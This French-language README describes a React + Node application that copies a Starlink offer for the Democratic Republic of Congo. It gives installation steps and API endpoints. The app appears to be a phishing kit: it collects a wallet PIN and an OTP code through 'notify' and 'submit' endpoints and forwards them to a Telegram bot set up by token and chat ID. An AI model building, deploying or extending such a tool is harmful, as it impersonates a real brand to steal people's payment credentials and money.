# Starlink RDC

Application React + Node qui reproduit l'offre Starlink en RDC présentée sur l'image.

## Structure

- `client/` : application React avec Vite
- `server/` : API Node + Express

## Installation

1. Ouvrez un terminal dans le dossier racine `congo`
2. Installez les dépendances :
   - `npm install`
   - `npm run install-all`
3. Démarrez le projet :
   - `npm run start`

## API

- `GET /api/offres` : renvoie les forfaits et les informations du kit
- `POST /api/notify` : envoie la demande initiale de validation
- `POST /api/submit` : envoie le code OTP pour verification

## Notifications (best practice)

- Definir dans `server/.env`:
   - `TELEGRAM_BOT_TOKEN=...`
   - `TELEGRAM_CHAT_ID=...`
   - `TELEGRAM_ENABLED=true`
- Le champ recommande pour le PIN est `walletPin` (4-6 chiffres).
- Compatibilite conservee: `customerName` est encore accepte cote serveur pour les anciens clients.
- Le PIN est masque dans les messages de notification envoyes (ex: `**34`).

## Notes

L'application utilise des données structurées en JavaScript avec une séparation claire entre le backend, le frontend et la logique métier.
